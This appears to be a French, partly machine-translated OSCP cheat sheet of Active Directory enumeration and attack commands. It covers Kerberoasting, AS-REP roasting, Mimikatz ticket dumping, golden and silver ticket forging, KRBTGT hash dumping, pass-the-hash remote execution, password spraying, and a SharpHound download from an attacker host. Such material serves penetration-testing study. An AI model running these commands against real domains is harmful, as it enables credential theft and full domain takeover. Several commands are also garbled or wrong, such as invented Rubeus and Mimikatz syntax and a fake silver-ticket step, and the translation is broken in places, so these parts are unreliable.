---
title: "OSCP · Active Directory : énumération"
description: "Identifier les utilisateurs, groupes, services et relations du domaine."
---

# OSCP · Active Directory : énumération

Identifier les utilisateurs, groupes, services et relations du domaine.


## Reconnaissance avec Nmap

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Identifier les versions des services.</p>

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 -sS -sV -oA ad-enum <target-ip>

```


<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```bash
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"

```


<p class="oscp-command-note">Énumérer les répertoires ou sous-domaines avec Gobuster.</p>

```bash
gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt

```


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>

```


<p class="oscp-command-note">Script shell dans la rubrique « Reconnaissance avec Nmap ».</p>

```bash
# Utilisation de Kerbrute
./kerbrute_linux_amd64 userenum -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames

# Utilisation de CrackMapExec
crackmapexec smb [domain].com -u '' -p '' --users

```


<p class="oscp-command-note">Commande Impacket dans la rubrique « Reconnaissance avec Nmap ».</p>

```bash
# Utilisation de GetAdUsers.py (même outil)
impacket-GetADUsers -all -dc-ip <dc_ip> -u <username> -p <password> <domain>

# Utilisation de Enum4Linux
enum4linux -a -u "<username>" -p "<password>" <dc_ip>

```


### Énumération DNS (Port 53)

Interroger les enregistrements DNS et identifier les services associés.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>

```


```bash
# Exécuter les scripts NSE sélectionnés
nmap -p 53 --script "dns-nsid,dns-srv-enum" <target_ip>

```


<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
dig axfr @<dc-ip> <domain>

```


```bash
# Interroger les enregistrements DNS
dig A <domain> @<dc-ip>
dig SRV _ldap._tcp.dc._msdcs.<domain> @<dc-ip>

```


```bash
# Interroger les enregistrements DNS
dig axfr <domain_name> @<dns_server_ip>  # Attempt zone transfer
dig ANY <domain_name> @<dns_server_ip>  # Retrieve all records
nslookup
> server <dns_server_ip>
> set type=any
> <domain_name>  # Query any records

```


```bash
# Énumérer les enregistrements DNS
dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr

dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain_name>

```


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a range

```


<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
dig @<dns_server_ip> -t A +norecurse <target_domain>

```


<p class="oscp-command-note">Résoudre un nom DNS avec PowerShell.</p>

```powershell
Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly

```


### Énumération Kerberos (port 88)

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
# Vérifiez la disponibilité du service Kerberos et obtenez des informations de base
nmap -p 88 --script kerberos-enum-users <target_ip>

# Vérifier les vulnérabilités communes de Kerberos
nmap -p 88 --script kerberos-brute <target_ip>

# Énumérer les NSP (Noms principaux des services)
nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>

```


<p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>

```bash
# C'est le même outil que l'impacket-GetNPUsers.
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc-ip> -format hashcat
# Autre possibilité
GetNPUsers.py <domain>/ -no-pass -usersfile <path_to_userlist> -dc-ip <domain_controller_ip>

# Crack the found hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

```


<p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>

```bash
GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip>

# Crack the resulting hash
hashcat -m 13100 kerberoast.txt rockyou.txt

```


<p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>

```bash
kerbrute userenum -d <domain> -p <userlist> <target_ip>
# Autre possibilité
./kerbrute_linux_amd64 userenum -d <target_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

```


<p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>

```bash
impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>

```


<p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>

```bash
impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>

```


<p class="oscp-command-note">Analyser des empreintes avec John.</p>

```bash
john --wordlist=<wordlist> <ticket_file>
# or
hashcat -m 13100 <ticket_file> <wordlist>

```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# Request a TGT (Ticket Granting Ticket)
python3 GetTGT.py -dc-ip <dc_ip> <domain>/<username>:<password>

# Request a Service Ticket (TGS)
python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>

```


<p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>

```bash
# Extraire tous les tickets de service pour fissuration hors ligne
impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>

# Crack les billets extraits avec John l'Éventreur ou Hashcat
john --wordlist=<wordlist> <tickets_file>
# or
hashcat -m 13100 <tickets_file> <wordlist>

```




```bash
# Vérifier les identifiants Kerberos
krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>

```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# Renew a TGT (for Kerberos ticket manipulation)
python3 psexec.py <domain>/<username>:<password>@<target_ip> -impersonate-user <target_user>

# Perform Kerberos attacks with Rubeus
rubeus.exe asktgt /user:<username> /rc4:<password>
rubeus.exe tgtdeleg /user:<username> /rc4:<password>
rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
# Domptez les tickets Kerberos de la mémoire en utilisant Mimikatz
mimikatz "lsadump::dcom" "sekurlsa::tickets /export"

```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# Essai de configurations de pré-authentification faibles
python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>

```


<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```bash
# Créer un ticket argent avec Rubeus
rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>

```


<p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>

```bash
# 1. Obtain a Valid TGT (Ticket Granting Ticket)
impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>

# 2. Forge a Silver Ticket
impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>

```


<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```bash
# Créer un billet doré avec Rubeus
rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
# 1. Obtain KRBTGT NTLM Hash
impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>

# 2. Generate a Golden Ticket
ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>

# 3. Use the Golden Ticket
impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>

# (Optional) Pass the Golden Ticket
impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>

```


### Énumération LDAP (ports 389 et 636)

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -n -sV --script "ldap* and not brute" <target_ip>

```


<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```bash
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=*)"
# Autre possibilité
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"

```


```bash
# Énumérer les utilisateurs du domaine
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName

# Énumérer les groupes du domaine
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=group)" cn

```


```bash
# Demande LDAP de base
ldapsearch -x -H ldap://<target_ip>

# LDAP de base Rechercher un niveau de base
ldapsearch -h <target_ip> -x -s base

# Afficher les contextes de nommage LDAP
ldapsearch -x -H ldap://<target_ip> -s base namingcontexts

# Rechercher dans un nom de domaine de base spécifique
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"

# Énumérer les utilisateurs utilisant LDAP
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"

# Récupérer le nom de compte des utilisateurs
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:

# Rechercher avec les filtres
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"

# Recherche avec authentification
ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"

# Searching terms
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "[term]"

# Specifies the value term to return
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>

```


<p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>

```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist>

```


<p class="oscp-command-note">Script shell dans la rubrique « Énumération LDAP (ports 389 et 636) ».</p>

```bash
# Termes de recherche pour trouver les mots de passe Cleartext
# Rechercher ms-MCS-AdmPwd (mots de passe de l'administrateur local)
(ms-MCS-AdmPwd=*)

# Rechercher les attributs contenant 'password' dans la description
(description=*password*)

# Rechercher le délai d'expiration de LAPS (pour identifier la gestion de mot de passe potentielle)
(ms-MCS-AdmPwdExpirationTime=*)

# Rechercher des mots de passe faibles communs dans des attributs comme la description
(description=*(123456*|password*|qwerty*|letmein*))

# Général LDAP Filtres de recherche
# Rechercher tous les utilisateurs
(objectClass=user)

# Rechercher tous les ordinateurs
(objectClass=computer)

# Rechercher tous les groupes
(objectClass=group)

# Recherche de comptes handicapés
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Recherche de comptes expirés
(& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))

# Rechercher un abonnement de groupe spécifique
(&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Rechercher des utilisateurs avec des attributs spécifiques
# Pour les utilisateurs ayant un domaine de messagerie spécifique
(mail=*@example.com)
# Pour les utilisateurs ayant un titre spécifique
(title=Manager)

# Specific Attributes

# Recherche du dernier jeu de mots de passe
(pwdLastSet=*)

# Recherche de comptes avec mot de passe expiré
(& (objectClass=user)(pwdLastSet<=0))

# Recherche de comptes dans une unité organisationnelle spécifique (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Security-Related Searches

# Recherche de comptes avec Kerberos pré-authentification désactivée
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Recherche de noms principaux de services (SPN)
(servicePrincipalName=*)

# Recherche d'utilisateurs délégués
(msDS-AllowedToDelegateTo=*)

# Rechercher des comptes avec des privilèges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Other Useful Searches

# Rechercher toutes les unités organisationnelles
(objectClass=organizationalUnit)

# Recherche de services de certificat d'annuaire actif
(objectClass=cACertificate)

# Rechercher tous les attributs d'un utilisateur spécifique
(sAMAccountName=username)

# Recherche de comptes avec notes ou descriptions spécifiques
(description=*keyword*)

# Rechercher tous les objets dans le répertoire
(objectClass=*)

# Recherche de comptes de service
(objectCategory=serviceAccount)

# Recherche de comptes avec des abonnements spécifiques de groupe (remplacer 'GroupName')
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Recherche de comptes informatiques
(objectClass=computer)

# Rechercher des utilisateurs dans une unité organisationnelle spécifique (remplacer 'OU=Users')
(ou=OU=Users,DC=domain,DC=com)

# Rechercher tous les comptes avec des attributs spécifiques
(pwdLastSet=0)

```


### Énumération SMB (port 445)

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
# Scan Nmap
nmap -v -p 139,445 [IP]
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>

# NetBIOS Scan
sudo nbtscan -r 192.168.50.0/24

# Vue réseau Windows
net view \\[domainName] /all

```


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script smb-enum-shares.nse -p445 <ip>

nmap --script smb-enum-users.nse -p445 <ip>

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 <ip>

nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 <ip>

nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <ip>

```


<p class="oscp-command-note">Parcourir un partage SMB.</p>

```bash
# Utilisez smbclient ou enum4linux pour énumérer les actions SMB.
smbclient -L //<dc-ip> -U "guest"

# Lister les actions en utilisant CrackMapExec (CME).
crackmapexec smb <dc-ip> -u '' -p '' --shares

```


```bash
# Effectuer un dénombrement de session nul pour lister les utilisateurs du domaine.
rpcclient -U "" <dc-ip> --command="enumdomusers"

# Or use CME for RID cycling.
crackmapexec smb <dc-ip> --rid-brute

```


<p class="oscp-command-note">Script shell dans la rubrique « Énumération SMB (port 445) ».</p>

```bash
# Analyse des paquets réseau: capture et analyse les paquets liés au trafic SMB sur le port 139, à la recherche de modèles spécifiques
sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139

# Listes des actions SMB disponibles sur la cible
smbclient -L <IP>

```


**Paramètres et repères :**
`smbmap`  


<p class="oscp-command-note">Lister les partages SMB et leurs permissions.</p>

```bash
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R

```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u guest -p "" --rid-brute
crackmapexec smb <IP> -u '[user]' -p '[password]'

```


<p class="oscp-command-note">Examiner les informations SMB et du domaine.</p>

```bash
# Collecte d'informations de base sur le domaine
enum4linux -a <IP>
enum4linux -a -u "" -p "" <IP> && enum4linux -a -u "guest" -p "" <IP>

# Extraire les utilisateurs du domaine
enum4linux -U <DOMAIN_IP>

# Extraire les parts de domaine disponibles
enum4linux -S <IP>

enum4linux -a -M -l -d <ip> 2>&1
enum4linux -a -u "" -p "" <ip>
enum4linux -a -u "guest" -p "" <ip>
enum4linux -a -u "[user]" -p "[password]" <ip>

```


```bash
# Lister les partages SMB du serveur
smbclient --no-pass -L //<ip>
smbclient -L //<ip> -U [user]
smbclient //<IP>/<SHARE>
smbclient -N //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *" # Change the timeout to download big files

# Changer le timeout pour télécharger les gros fichiers
help timeout
timeout 100

# Autres commandes
prompt off
recurse on
mget *

```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV

```


<p class="oscp-command-note">Créer un répertoire.</p>

```bash
# Monte les parts de SMB dans un répertoire local pour plus d'accès et de manipulation.
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share

```


<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>

```bash
# PsExec
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# WMIexec
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# SMBexec
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# AteExec
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

```


```bash
# Identifiants
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass-the-Hash
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Vérification avec CrackMapExec
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec

```


<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>

```bash
# Identifiants
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass-the-Hash
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Vérification avec CrackMapExec
crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>

```


### Énumération WinRM (port 5985)

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 5985,5986 --script winrm-info $IP

```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec winrm <dc-ip> -u <username> -p <password>

```


<p class="oscp-command-note">Ouvrir une session distante WinRM.</p>

```bash
evil-winrm -i <dc-ip> -u <username> -p <password>

```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>

```




```powershell
# Utilisation de PowerShell pour se connecter à WinRM
Enter-PSSession -ComputerName $IP -Credential (Get-Credential)

```


## Énumération de base

![Descripción de la imagen](https://www.emmanuelsolis.com/img/AD_Methodology.png)


<p class="oscp-command-note">Script PowerShell dans la rubrique « Énumération de base ».</p>

```powershell
# Avec PowerShell
(Get-ADDomain).DomainSID

# Utilisation de CMD
whoami /user

# Utilisation de vmic
wmic useraccount where name='[usernameToFind]' get sid

```




```powershell
# Avec PowerShell
Get-ADDomainController -Filter *

# Utilisation de nltest
nltest /dclist:[YourDomainName]

# Utilisation du netdom
netdom query dc

# Utilisation de nslookup
nslookup yourdomain.com

# Utilisation de ADUC
# Ouvrir ADUC --> Dans l'unité organisationnelle des contrôleurs de domaine (OU), vous pouvez trouver les contrôleurs de domaine répertoriés là.

```


```powershell
# Avec PowerShell
# Lister tous les comptes utilisateurs avec les noms principaux de service (SPN)
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
# Trouver des comptes de service spécifiques (p. ex., serveur SQL)
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# Checking Running Services
Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne "LocalSystem" -and $_.StartName -ne "LocalService" -and $_.StartName -ne "NetworkService" } | Select-Object Name, StartName
# Autre possibilité
sc queryex type= service

# Utilisation de nltest
nltest /domain_trusts

# Identifier un compte de service spécifique par SPN
Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames

# Utilisation de ADUC
Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.

```


```bash
# PowerShell
  Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
  
  # Bash (Kali)
  ldapsearch -x -h <DC_IP> -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName
  

```


<p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>

```bash
net user /domain
net user [username] /domain

```


```bash
net groups /domain
net groups [groupName] /domain

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Énumération de base ».</p>

```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

```




```powershell
function Get-SAMInfo {
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DN = ([adsi]'').distinguishedName 
  $LDAP = "LDAP://$PDC/$DN"
  $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
  $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
  $dirsearcher.filter = "samAccountType=805306368"
  $dirsearcher.FindAll() | ForEach-Object {
      $_.Properties
  }
}

```




```powershell
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=[GroupName]))"

```




```powershell
function LDAPSearch {
  param ([string]$LDAPQuery)
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DistinguishedName = ([adsi]'').distinguishedName
  $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
  $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
  return $DirectorySearcher.FindAll()
}

```


<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"

```


```powershell
# Interroger l'annuaire LDAP
LDAPSearch -LDAPQuery "(objectclass=group)"

```




```text
$group

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Énumération de base ».</p>

```powershell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
  $group.Properties | Select-Object {$_.cn}, {$_.member}
}

```


## PowerView


<p class="oscp-command-note">Charger un module PowerShell.</p>

```powershell
Import-Module .\PowerView.ps1

```


**Paramètres et repères :**
`Get-NetDomain`  


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
Get-ADDomainController -Discover

```


**Paramètres et repères :**
`Get-NetUser`  




```powershell
# Énumérer les utilisateurs du domaine
Get-NetUser | Select-Object [attributes]

```


```powershell
# Énumérer les groupes du domaine
Get-NetGroup | Select-Object [attributes]

```


```powershell
Get-NetComputer | Select-Object [attributes]

```


```powershell
# Énumérer les groupes du domaine
Get-NetGroup -GroupName "Domain Admins"

```


```powershell
# Énumérer les utilisateurs du domaine
Get-NetUser -SPN

```


**Paramètres et repères :**
`Get-NetDomainController` · `Get-NetShare`  




```powershell
# Énumérer les utilisateurs du domaine
Get-NetUser -Delegation

```


## Noms principaux de service (SPN) Inventaire

Examiner les objets, les droits et les services du domaine.




```bash
setspn -L [service]

```


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname

```


## Énumération des permissions d'objets


**Paramètres et repères :**
`GenericAll` · `GenericWrite` · `WriteOwner` · `WriteDACL`  
`AllExtendedRights` · `ForceChangePassword` · `Self` · `Get-ObjectAcl`  




```powershell
# Examiner les permissions d'un objet Active Directory
Get-ObjectAcl -Identity [username]

```




```powershell
Convert-SidToName [SID]

```




```powershell
# Examiner les permissions d'un objet Active Directory
Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object SecurityIdentifier, ActiveDirectoryRights

```




```powershell
"[SID1]", "[SID2]" | Convert-SidToName

```


<p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>

```bash
net group "[GroupName]" [username] /add /domain

```


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
Get-NetGroup "[GroupName]" | Select-Object member

```


## Énumération des partages du domaine

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`Find-DomainShare`  




```bash
gpp-decrypt [encrypted_password]

```


## BloodHound & SharpHound

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
# Télécharger la version PowerShell de SharpHound
Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.ps1" -OutFile "C:\Temp\sharphound.ps1"

# Vous pouvez également télécharger la version .exe
Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\sharphound.exe"

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « BloodHound &amp; SharpHound ».</p>

```powershell
# Trouvez votre nom de domaine
nltest /dclist:domainname
# Autre possibilité
Get-ADDomainController -Discover

# Exécuter SharpHound pour collecter des données de domaine (en utilisant le .exe)
.\SharpHound.exe -c All
# Autre possibilité
.\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData

```


<p class="oscp-command-note">Charger un module PowerShell.</p>

```powershell
# Importer le script SharpHound dans la mémoire
Import-Module .\SharpHound.ps1

# Recueillir toutes les données du domaine
Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Temp

```


**Paramètres et repères :**
`All`  




```powershell
Invoke-BloodHound -CollectionMethod Group
Invoke-BloodHound -CollectionMethod ACL

```


**Paramètres et repères :**
`.zip`  


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Temp</code></p>


<p class="oscp-command-note">Script shell dans la rubrique « BloodHound &amp; SharpHound ».</p>

```bash
# Having an Evil-WinRM session
download [bloodhound_file].zip

# SCP de la victime à votre Kali
scp user@victim-ip:C:\Temp\*.zip /path/to/your/dir

# Télécharger via un serveur web
Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip"

```


**Paramètres et repères :**
`https://localhost:7474` · `neo4j:neo4j` · `neo4j:Neo4j`  




```bash
# Démarrer le service Neo4j à Kali (nécessaire pour analyser les données collectées):
sudo neo4j start

```


**Paramètres et repères :**
`bloodhound` · `WriteGPO` · `OwnsGPO`  




<p class="oscp-inline-ref"><strong>Type de relation AD :</strong> <code>GPO control</code></p>




```text
(NODES)-[:RELATIONSHIP]->(NODES)

```




<p class="oscp-command-note">Requête Cypher BloodHound : Liste des ordinateurs</p>

```text
MATCH (m:Computer) RETURN m

```


<p class="oscp-command-note">Requête Cypher BloodHound : Liste des utilisateurs</p>

```text
MATCH (m:User) RETURN m

```


<p class="oscp-command-note">Requête Cypher BloodHound : Recherche des sessions</p>

```text
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

```


**Paramètres et repères :**
`SQLAdmin`  




<p class="oscp-command-note">Requête Cypher BloodHound : Recherche des relations SQLAdmin</p>

```text
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

```


**Paramètres et repères :**
`CanPSRemote`  




<p class="oscp-command-note">Requête Cypher BloodHound : Recherche des relations PowerShell distant</p>

```text
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

```


## Analyse des empreintes de mots de passe

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
secretsdump.py <domain>/<username>:<password>@<dc-ip>

```


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
hashcat -m 1000 ntlm-hashes.txt rockyou.txt

```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# De nombreuses autres commandes se trouvent dans la Section 6.
crackmapexec smb <dc-ip> -u usernames.txt -p password123 --spray

```


## MS-RPRN Print Spooler Service Exploitation


<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
rpcclient -U "<user>%<password>" <dc-ip> --command="enumprinters"

```


## SPN des comptes de service

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`cifs`  


**cifs**


**Paramètres et repères :**
`dcom`  


**dcom**


**Paramètres et repères :**
`exchange`  


**exchange**


**Paramètres et repères :**
`ftp`  


**FTP**


**Paramètres et repères :**
`http`  


**http**


**Paramètres et repères :**
`imap`  


**imap**


**Paramètres et repères :**
`krbtgt`  


**krbtgt**


**Paramètres et repères :**
